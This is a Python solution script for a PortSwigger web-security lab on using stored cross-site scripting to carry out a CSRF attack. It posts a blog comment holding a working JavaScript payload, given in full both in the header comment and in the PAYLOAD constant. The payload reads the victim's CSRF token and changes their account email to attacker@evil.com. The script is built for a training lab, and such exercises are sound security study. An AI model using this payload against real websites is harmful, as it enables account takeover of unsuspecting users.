# Lab 16 — Exploiting XSS to perform CSRF
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
#
# Vulnerability: Blog comments (stored XSS)
# Aim:           Use XSS to make the victim change their email address
#
# Technique:
#   XSS executes in the victim's browser at the same origin — meaning it can:
#     1. Fetch /my-account (same origin → no CORS restriction)
#     2. Read the CSRF token from the response DOM
#     3. POST to /my-account/change-email with the stolen token
#
#   This is why XSS always outranks CSRF in severity:
#   XSS executes IN the origin, so CSRF tokens are freely readable.
#
#   Payload posted as a blog comment:
#     <script>
#     var req = new XMLHttpRequest();
#     req.onload = handleResponse;
#     req.open('get','/my-account',true);
#     req.send();
#     function handleResponse() {
#         var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
#         var changeReq = new XMLHttpRequest();
#         changeReq.open('post','/my-account/change-email',true);
#         changeReq.send('csrf='+token+'&email=attacker@evil.com');
#     }
#     </script>
#
# Usage: python xss_lab16.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, post_comment

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

POST_ID = 1

PAYLOAD = (
    "<script>\n"
    "var req = new XMLHttpRequest();\n"
    "req.onload = handleResponse;\n"
    "req.open('get','/my-account',true);\n"
    "req.send();\n"
    "function handleResponse() {\n"
    "    var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];\n"
    "    var changeReq = new XMLHttpRequest();\n"
    "    changeReq.open('post','/my-account/change-email',true);\n"
    "    changeReq.send('csrf='+token+'&email=attacker@evil.com');\n"
    "}\n"
    "</script>"
)

if __name__ == "__main__":
    banner()
    section("LAB 16 — EXPLOITING XSS: CSRF (EMAIL CHANGE)")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab16.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Posting CSRF-via-XSS payload to post {POST_ID}...\n")
    r = post_comment(session, url, POST_ID, PAYLOAD)

    if r is None:
        print("  ✘  Comment submission failed")
        sys.exit(1)

    print(f"  ✔  Comment submitted (status {r.status_code})")
    print()
    print("  ➜  When the simulated victim views the post:")
    print("     1. Their browser executes the script at the same origin")
    print("     2. XHR fetches /my-account → reads the CSRF token from the DOM")
    print("     3. Second XHR POSTs the email change with the stolen token")
    print("     4. Victim's email is changed to attacker@evil.com")
    print()
    print("  ➜  Verify by logging in as the victim and checking /my-account")
    print(f"     {url}/post?postId={POST_ID}")
    print()
    print("  ℹ  XSS runs in the same origin → CSRF tokens provide zero protection.")
